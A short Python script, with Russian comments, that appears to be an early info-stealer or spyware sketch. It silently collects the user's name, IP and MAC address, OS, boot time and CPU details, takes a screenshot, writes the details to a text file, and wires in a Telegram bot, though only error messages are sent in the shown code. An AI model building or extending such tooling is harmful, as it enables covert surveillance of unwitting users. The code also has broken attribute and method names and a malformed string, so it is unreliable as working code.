import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
from pyspeedtest import SpeedTest
import telebot
import psutil
import platform
from PIL import Image

# Данные о пользователе, ip, mac-адресе, название ОС
from telbot import bot

name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
print(name, ip, mac, ost)

# Время, заданное на компьютере
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
print(time)

# Частота процессора
cpu = psutil.cpu_freq()
print(cpu)

# Снятие скриншота
os.getcwd()
try:
    os.chdir(r'/temp/path')
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, '[Error]: Location not found!')
        bot.stop_pooling()


    bot.polling()
    raise SystemExit

screen = pyautogui.screenshot('screenshot.jpg')

try:
    os.chdir(r'/temp/path')
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, '[Error]: Location not found!')
        bot.stop_pooling()


    bot.polling()
    raise SystemExit

file = open('info.txt', 'w')

file.write(
    f'[============================================]\n Operating System: {ost.systeml}\n Processor: {ost.processor}\n'
    f' Username: {name}\n IP adress: {ip}\n МАС adress: {mac}\n Timezone: {time.year}/{time.month}/{time.day}'
    f'{time.hour}:{time.minute}:{time.second}\n MAX Frequency: {cpu.max:.2f} Мhz\n '
    f'Min Frequency: {cpu.min:.2f} Mhz\n Current Frequency: {cpu.current: .2f} Mhz\n'
    f'[================================================]\n")')
file.close()